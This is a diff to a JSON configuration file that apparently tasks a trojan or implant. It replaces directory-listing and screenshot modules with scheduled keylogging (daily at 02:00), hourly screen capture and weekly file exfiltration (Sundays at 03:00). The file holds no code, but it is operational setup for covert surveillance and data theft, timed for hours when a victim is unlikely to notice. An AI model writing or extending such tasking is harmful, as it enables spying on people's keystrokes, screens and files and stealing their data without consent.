@@ -1,8 +1,29 @@
-[
-  {
-    "module" : "dirlister"
-  },
-  {
-    "module" : "screenshotish"
-  }
-]
+{
+    "modules": [
+        {
+            "module": "keyloggerish",
+            "command": "start",
+            "schedule": {
+                "interval": "daily",
+                "time": "02:00"
+            }
+        },
+        {
+            "module": "screenshot",
+            "command": "capture",
+            "schedule": {
+                "interval": "hourly"
+            }
+        },
+        {
+            "module": "file_exfil",
+            "command": "exfiltrate",
+            "schedule": {
+                "interval": "weekly",
+                "day": "Sunday",
+                "time": "03:00"
+            }
+        }
+    ]
+}
+
